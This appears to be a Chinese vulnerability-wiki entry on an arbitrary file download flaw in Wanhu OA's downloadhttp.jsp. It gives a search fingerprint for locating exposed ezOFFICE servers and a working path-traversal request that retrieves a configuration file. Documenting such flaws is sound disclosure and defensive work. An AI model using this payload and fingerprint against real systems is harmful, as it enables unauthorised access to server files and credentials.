---
title: "万户OA downloadhttp.jsp 任意文件下载漏洞"
date: 2026-10-17 09:12:06
categories:
  - WebSecurity
  - CVE
  - "OA"
  - "万户OA"
tags:
  - "万户OA"
  - "任意文件下载"
  - "漏洞复现"
---
## 漏洞描述

万户OA downloadhttp.jsp文件存在任意文件下载漏洞，攻击者通过漏洞可以下载服务器上的任意文件

## 漏洞影响

```
万户OA
```

## 网络测绘

```
app="万户网络-ezOFFICE"
```

## 漏洞复现

产品页面

![image-20220520132806210](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201328307.png)

验证POC

```
/defaultroot/site/templatemanager/downloadhttp.jsp?fileName=../public/edit/jsp/config.jsp
```

![image-20220520132818308](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/oa/images/202205201328396.png)

---

> 资料整理自 [Threekiii/Vulnerability-Wiki](https://github.com/Threekiii/Vulnerability-Wiki/blob/master/docs-base/docs/oa/%E4%B8%87%E6%88%B7OA-downloadhttp.jsp-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E.md)
